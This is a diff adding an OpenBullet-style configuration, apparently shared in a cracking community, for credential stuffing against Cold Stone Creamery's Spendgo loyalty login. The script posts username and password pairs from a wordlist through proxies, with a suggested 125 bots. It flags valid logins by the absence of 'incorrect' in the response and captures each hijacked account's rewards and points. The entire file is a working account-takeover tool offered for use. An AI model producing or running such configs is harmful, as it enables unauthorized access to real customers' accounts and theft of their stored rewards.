@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "ColdstoneCreamery",
+  "SuggestedBots": 125,
+  "LastModified": "2018-10-20T04:11:49.3783725+00:00",
+  "AdditionalInfo": "|Proxyless works too|Capture rewards|Captures points|",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://my.spendgo.com/consumer/gen/coldstone/v1/signin" AutoRedirect=TRUE 
+  CONTENT "{\"value\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.spendgo.com/coldstone/index.html" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "incorrect" 
+#Details REQUEST POST "https://my.spendgo.com/consumer/gen/coldstone/v2/rewardsAndOffers" AutoRedirect=TRUE 
+  CONTENT "{\"value\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.spendgo.com/coldstone/index.html" 
+#Rewards PARSE "<SOURCE>" LR "rewards_count\":" "," Recursive=FALSE -> CAP "Rewards" "" "" 
+#Points PARSE "<SOURCE>" LR "point_total\":" "," Recursive=FALSE -> CAP "Points" "" "" 
